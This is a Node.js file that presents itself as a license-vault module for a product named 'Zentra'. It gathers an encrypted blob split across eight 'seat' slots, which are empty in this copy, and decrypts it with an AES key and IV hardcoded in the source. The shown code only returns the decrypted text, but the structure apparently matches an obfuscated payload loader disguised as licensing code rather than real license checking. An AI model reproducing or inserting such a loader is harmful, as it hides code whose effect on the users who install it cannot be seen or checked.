'use strict';

const crypto = require('crypto');
const path = require('path');
const os = require('os');
const fs = require('fs');

const LICENSE_VAULT = {
  id: 'lv-4677e8',
  product: 'Zentra',
  buildId: '426f374840065b06',
  issuer: 'https://license.zentra-soft.com/v1',
};

const LICENSE_SLOTS = {
  seat_a: "",
  seat_b: "",
  seat_c: "",
  seat_d: "",
  seat_e: "",
  seat_f: "",
  seat_g: "",
  seat_h: "",
};

const SLOT_ORDER = ["seat_a","seat_b","seat_c","seat_d","seat_e","seat_f","seat_g","seat_h"];

function licenseCacheDir() {
  try {
    var base = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
    var dir = path.join(base, LICENSE_VAULT.product, 'License');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    return dir;
  } catch (_e) {
    return null;
  }
}

function assembleLicenseBlob() {
  var out = '';
  for (var i = 0; i < SLOT_ORDER.length; i++) {
    var id = SLOT_ORDER[i];
    var part = String(LICENSE_SLOTS[id] || '');
    if (i === SLOT_ORDER.length - 1) {
      var eq = part.lastIndexOf('=');
      if (eq > 0 && part.length - eq <= 14) part = part.slice(0, eq);
    }
    out += part;
  }
  return out;
}

function unlockLicenseVault() {
  var packed = assembleLicenseBlob();
  var key = Buffer.from([34,3,181,78,67,131,112,98,23,166,22,2,162,249,21,51,153,87,117,18,41,57,114,117,102,140,182,166,172,55,36,19]);
  var iv = Buffer.from([125,47,135,28,104,56,80,89,124,230,182,252,40,184,83,230]);
  var decipher = crypto.createDecipheriv('aes-256-ctr', key, iv);
  var plain = Buffer.concat([
    decipher.update(Buffer.from(packed, 'base64')),
    decipher.final(),
  ]).toString('utf8');
  if (!plain || plain.length < 64) {
    throw new Error('license unlock failed (' + LICENSE_VAULT.id + ')');
  }
  return plain;
}

